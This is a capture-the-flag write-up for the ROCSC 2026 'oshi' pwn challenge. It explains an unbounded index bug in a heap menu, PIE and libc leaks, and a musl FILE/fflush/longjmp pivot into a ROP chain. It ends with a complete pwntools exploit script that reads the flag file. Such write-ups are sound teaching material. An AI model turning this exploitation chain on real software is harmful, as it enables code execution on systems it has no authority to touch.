# ROCSC 2026 - oshi (pwn) Writeup

ROCSC 2026 quals were a lot of fun, and I’m happy to have qualified to the finals. This challenge stood out because it mixed a classic heap menu with a non‑glibc runtime. I’ll keep the story tight and practical: the exact observations, the reasoning behind each step, and how those choices lead naturally to the final exploit.

Challenge description: “If you know the enemy and know your bărbiță, you need not fear.”

## Binary Triage


![img](/assets/img/ROCSC2026/oshi/file.png)

The `file` output tells me if it’s PIE, whether it’s stripped, and which loader it expects. That immediately informs whether I need leaks and whether I’m in glibc or musl land.

This confirms the libc flavor on the server. Seeing musl here changes the playbook: FILE internals differ, and musl’s `fflush`/`longjmp` path becomes the cleanest pivot.

![img](/assets/img/ROCSC2026/oshi/checksec.png)

From `checksec`, I learn which classic paths are closed. Full RELRO blocks GOT overwrite, Canary/NX block stack smashing, and PIE means I need a leak before I can do anything serious.

Those prompt strings are my entry points in IDA. In a stripped binary, strings and xrefs are how I recover the menu loop and handlers quickly.

Looking at sections gives me a feel for `.bss` size. If `.bss` is compact, OOB indices have a much higher chance of reaching adjacent globals or tables.

![img](/assets/img/ROCSC2026/oshi/readelflibc.png)

This symbol list tells me that musl exports `stdout`, `fflush`, and `longjmp`. That’s exactly the trio I need for an FSOP pivot into a ROP chain.
The exploit therefore needs to be **pure ORW**: open the flag file, read it into a buffer, and write it back to stdout.

## Vulnerability Summary (Story Form)

This challenge presents a friendly menu: allocate, free, print, edit. The allocator is musl, which already puts you in a different mental model than glibc. I started at the menu string in IDA and immediately followed the xrefs into the handlers. The mistake is not in musl though — it’s in the **indexing logic**.

`show` and `edit` only check that an index is non‑negative. They do **not** check the upper bound. That means you can read and write **past the end of the chunk pointer table**. In the decompilation, the pointer table lives at `unk_40E0` and the size table is `qword_4060`. `show` does `write(1, *(void **)&unk_40E0[idx], qword_4060[idx] & 0xFFF)`, and `edit` does `read(0, *(void **)&unk_40E0[idx], qword_4060[idx] & 0xFFF)`. When `idx` is large, both tables are indexed out of bounds into adjacent `.bss` data, which gives you leaks and a write primitive.

There is also a UAF in `free` (the pointer isn’t cleared), but it’s not needed once the OOB read/write is available.

Once we have leaks, the rest is straightforward: compute PIE base, compute libc base, and use an FSOP‑style pivot with musl’s `FILE` + `longjmp` to land on a ROP chain that performs ORW.

## Exploit Strategy (High Level, Derived Without Using s.py)

1. **Leak**: allocate once, then use `show` with an out‑of‑range index to spill `.bss` and heap metadata.
2. **Compute bases**: recover PIE base from a code pointer and libc base from a stdio pointer.
3. **Arb write**: use `edit` with an OOB index to redirect a pointer table entry, giving a write‑what‑where.
4. **FSOP pivot**: repoint the stdio list head to a fake musl `FILE` structure on the heap.
5. **ORW ROP**: trigger `exit` → `fflush` → `longjmp`, landing in a ROP chain that opens and prints the flag.

### 1) Find the menu loop and handlers (IDA)

![img](/assets/img/ROCSC2026/oshi/main.png)

### 2) Identify the global pointer/size tables (.bss)

![img](/assets/img/ROCSC2026/oshi/alloc.png)

From the menu dispatcher, follow the `Alloc` handler. In IDA:
- Look for `malloc(size)` and where the returned pointer is stored.
- The pointer table is a contiguous array in `.bss` (check `.bss` size from `readelf -S`).
- The size table is another array in `.bss` (often parallel to the pointer table).

This gives you the base addresses for `ptrs[]` and `sizes[]` in `.bss`.

These addresses are used later to compute the special index (`writer_idx`) for an arbitrary write.

### 3) Locate the OOB leak in `Print`

![img](/assets/img/ROCSC2026/oshi/print.png)

In the `Print` handler (xref from string `"Data: "`):
- It fetches `*(void **)&unk_40E0[idx]` and `qword_4060[idx]` and prints `qword_4060[idx] & 0xFFF` bytes from that pointer.
- There is no bounds check on `idx`, so `idx=16` reads beyond the real tables and into adjacent `.bss` data.

The leak includes:
- A heap pointer (used for heap metadata).
- A PIE pointer into `.text` (lets you compute the binary base).
- A libc pointer (inside musl's `stdout` FILE struct or related stdio metadata).

### 4) Compute PIE base from the leaked text pointer

In IDA, identify which code pointer is leaked:
- From the leaked QWORDs, locate the one that falls in the `.text` range (offsets around `0x1110` to `0x1850`).
- In IDA, find the matching function start address.
- PIE base = leaked_text_ptr - function_offset.

This gives `MAIN_BASE`.

### 5) Compute libc base from the leaked stdio pointer

In musl, the `stdout` symbol exists in `libc.so`. Use:

![img](/assets/img/ROCSC2026/oshi/muslstdout.png)

This gives the offset of `stdout`.

From the leak:
- Identify a pointer that points into libc (upper bits match the libc mapping).
- The leaked pointer is within the `stdout` FILE struct; the offset is stable across runs.
- libc base = leaked_ptr - offset_into_libc.

### 6) Find the stdio list head (`__stdio_head`)

We need the global pointer that `fflush` walks.

![img](/assets/img/ROCSC2026/oshi/fflush.png)

In IDA on `app/libc.so`:
- Jump to `fflush` (symbol is present).
- Identify the global pointer it loads before iterating FILEs (the stdio list head).
- The referenced address is `__stdio_head` (or equivalent), and its offset in libc is your `STDIO_HEAD` offset.

This gives the offset used to redirect the list head to a fake FILE.

### 7) Find `longjmp` and syscalls (for ROP)

![img](/assets/img/ROCSC2026/oshi/longjmp.png)

- `longjmp` is exported. Use its symbol offset.
- Use ROP gadgets from `libc.so` (pop registers, syscall, ret).

### 8) Confirm the write primitive via `Edit`

In IDA, in the `Edit` handler (xref from `"New Content:"`):
- It uses `qword_4060[idx] & 0xFFF` to determine how many bytes to write into `*(void **)&unk_40E0[idx]`.
- Once we control a size entry and a pointer entry via OOB indexing, we can write anywhere.

![img](/assets/img/ROCSC2026/oshi/edit.png)

### 9) Bonus: UAF in `Free` (not required)

In the `Free` handler (xref from `"Freed."`), the pointer is freed but never zeroed. That gives a UAF, but the OOB read/write is stronger and more reliable, so we don’t need it for the final chain.

## Clean Exploit Script 

```bash
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "host"
PORT = port

LIBC_PATH = "./app/libc.so"
libc = ELF(LIBC_PATH, checksec=False)

# Offsets taken from local analysis of musl fflush/stdio path.
OFF_STDIO_HEAD = 0xAD3A0
STDOUT_LEAK_OFF = 0xAFF40


def menu_sync(p):
    p.recvuntil(b"> ")


def alloc(p, idx, size, data=b"A"):
    menu_sync(p)
    p.sendline(b"1")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    if size > 0:
        p.sendafter(b"Content: ", data.ljust(size, b"\x00")[:size])


def edit_exact(p, idx, data, size):
    menu_sync(p)
    p.sendline(b"4")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendafter(b"New Content: ", data.ljust(size, b"\x00")[:size])
    p.recvuntil(b"Edited.")


def print_once(p, idx):
    menu_sync(p)
    p.sendline(b"3")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.recvuntil(b"Data: ")
    blob = p.recvuntil(b"\n1. Alloc", drop=False)
    marker = b"\n1. Alloc"
    return blob[: -len(marker)]


def parse_qwords(blob):
    return [u64(blob[i:i + 8].ljust(8, b"\x00")) for i in range(0, len(blob), 8)]


def build_fake_file_and_rop(libc_base, fake_addr):
    rop = ROP(libc)
    pop_rdi = libc_base + rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rsi = libc_base + rop.find_gadget(["pop rsi", "ret"])[0]
    pop_rdx = libc_base + rop.find_gadget(["pop rdx", "ret"])[0]
    pop_rax = libc_base + rop.find_gadget(["pop rax", "ret"])[0]
    syscall = libc_base + rop.find_gadget(["syscall", "ret"])[0]
    ret = libc_base + rop.find_gadget(["ret"])[0]
    longjmp = libc_base + libc.symbols["longjmp"]

    payload = bytearray(0x400)
    # FILE struct layout for musl: force fflush() to jump via longjmp.
    payload[0x28:0x30] = p64(0xFFFFFFFFFFFFFFFF)  # wpos: force flush path
    payload[0x30:0x38] = p64(fake_addr + 0x100)   # longjmp rsp
    payload[0x38:0x40] = p64(ret)                 # longjmp rip (ret for alignment)
    payload[0x40:0x48] = p64(longjmp)             # write callback
    payload[0x48:0x50] = p64(longjmp)             # alt callback slot
    payload[0x8C:0x90] = p32(0xFFFFFFFF)          # unlocked

    path = fake_addr + 0x220
    buf = fake_addr + 0x260
    chain = [
        pop_rdi, path,
        pop_rsi, 0,
        pop_rax, 2,   # open
        syscall,

        pop_rdi, 3,
        pop_rsi, buf,
        pop_rdx, 0x100,
        pop_rax, 0,   # read
        syscall,

        pop_rdi, 1,
        pop_rsi, buf,
        pop_rdx, 0x100,
        pop_rax, 1,   # write
        syscall,

        pop_rdi, 0,
        pop_rax, 60,  # exit
        syscall,
    ]
    chain_bytes = b"".join(p64(x) for x in chain)
    payload[0x100:0x100 + len(chain_bytes)] = chain_bytes
    payload[0x220:0x220 + len(b"/home/ctf/flag.txt\x00")] = b"/home/ctf/flag.txt\x00"
    return bytes(payload)


def exploit():
    p = remote(HOST, PORT)

    # 1) Allocate one chunk, then use OOB print to leak metadata.
    alloc(p, 0, 0x100, b"A")
    leak_blob = print_once(p, 16)
    leak_q = parse_qwords(leak_blob)

    leak_size = len(leak_blob) - 1  # subtract putchar('\\n') byte
    heap_meta = leak_q[0]
    main_base = leak_q[2] - 0x4160
    libc_base = leak_q[22] - STDOUT_LEAK_OFF

    writer_idx = (heap_meta + 0x80 - (main_base + 0x40E0)) // 8
    if writer_idx < 0:
        log.failure(f"writer_idx negative: {writer_idx}")
        return

    log.success(f"MAIN_BASE={hex(main_base)}")
    log.success(f"LIBC_BASE={hex(libc_base)}")
    log.info(f"heap_meta={hex(heap_meta)} leak_size={hex(leak_size)} writer_idx={writer_idx}")

    fake_file_addr = heap_meta + 0x500
    stdio_head_addr = libc_base + OFF_STDIO_HEAD

    # Stage 1: program writer primitive to target stdio head pointer.
    stage1 = bytearray(leak_size)
    stage1[0:8] = p64(0x400)               # size for writer_idx (at heap_meta + 0x0)
    stage1[0x80:0x88] = p64(stdio_head_addr)  # ptr for writer_idx (at heap_meta + 0x80)
    edit_exact(p, 16, bytes(stage1), leak_size)

    # Use writer primitive to overwrite libc stdio head pointer.
    edit_exact(p, writer_idx, p64(fake_file_addr), 0x400)

    # Stage 2: repoint writer primitive to fake_file_addr itself.
    stage2 = bytearray(leak_size)
    stage2[0:8] = p64(0x400)
    stage2[0x80:0x88] = p64(fake_file_addr)
    edit_exact(p, 16, bytes(stage2), leak_size)

    fake = build_fake_file_and_rop(libc_base, fake_file_addr)
    edit_exact(p, writer_idx, fake, 0x400)

    menu_sync(p)
    p.sendline(b"5")  # exit -> fflush -> longjmp -> ROP
    out = p.recvall(timeout=3)
    print(out.decode("latin-1", errors="ignore"))


if __name__ == "__main__":
    exploit()
```
